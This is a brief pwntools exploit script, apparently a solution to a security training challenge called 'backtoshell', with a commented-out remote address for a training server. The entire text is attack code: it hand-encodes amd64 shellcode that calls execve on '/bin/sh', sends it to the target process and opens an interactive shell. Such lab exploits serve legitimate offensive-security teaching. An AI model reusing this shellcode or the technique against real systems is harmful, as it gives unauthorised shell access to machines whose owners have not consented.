from pwn import *

asm_code = """
nop
nop
mov rdi, rax
add rdi, 21
mov rax, 0x3b
syscall
nop
nop
nop
"""

context.arch = 'amd64'

#shellcode = asm(asm_code + "/bin/sh")
shellcode2 = b"\x90\x90\x48\x89\xC7\x48\x83\xC7\x15\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x90\x90\x90/bin/sh"
p = process("./backtoshell")
#p = remote("bin.training.offdef.it", 3001)
p.send(shellcode2)
p.interactive()